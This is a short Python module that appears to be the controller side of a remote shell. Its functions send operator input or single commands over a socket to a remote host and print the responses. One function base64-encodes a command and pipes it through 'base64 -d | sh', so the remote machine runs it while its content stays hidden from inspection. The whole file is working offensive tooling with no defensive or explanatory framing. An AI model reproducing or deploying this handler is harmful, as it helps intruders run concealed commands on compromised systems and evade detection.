import threading
import base64

def listenAndSend(client_socket):
    start_listen(client_socket)

    while True:
        buffer = input()
        buffer += '\n'
        client_socket.send(buffer.encode())

def sendCommand(client_socket, cmd):
    start_listen(client_socket)

    buffer = cmd
    buffer += '\nexit\n'
    client_socket.send(buffer.encode())

def sendCommandObfuscated(client_socket, cmd):
    start_listen(client_socket)

    bytes_b64 = base64.b64encode(cmd.encode('utf-8'))
    obfuscated = bytes_b64.decode('utf-8')

    payload = 'echo "' + obfuscated + '" | base64 -d | sh\nexit\n'

    client_socket.send(payload.encode())

def start_listen(client_socket):
    read_thread = threading.Thread(target=listen, args=(client_socket,))
    read_thread.start()

def listen(client_socket):
    while True:
        recv_len = 1
        response = ''
        while recv_len:
            data = client_socket.recv(4096)
            recv_len = len(data)
            response += data.decode()
            if recv_len < 4096:
                break
        if response:
            print(response, end='')
